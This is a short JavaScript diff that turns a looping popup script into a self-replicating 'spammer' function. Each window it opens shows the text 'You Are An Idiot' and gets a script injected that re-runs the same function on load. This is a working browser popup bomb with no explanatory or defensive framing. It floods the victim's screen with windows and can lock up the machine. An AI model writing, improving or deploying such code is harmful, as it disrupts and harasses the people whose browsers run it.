@@ -1,5 +1,10 @@
-while(true){
+function spammer(){
+  while(true){
   wind = window.open()
-    idiot = wind.document.createTextNode("You Are An Idiot")
-      wind.document.body.appendChild(idiot)
+  script = wind.document.createElement('script')
+  script.innerHTML = 'wind.onload = ' + spammer.toString() + ';';
+  wind.document.appendChild(script)
+  idiot = wind.document.createTextNode("You Are An Idiot")
+  wind.document.body.appendChild(idiot)
+  }
 }
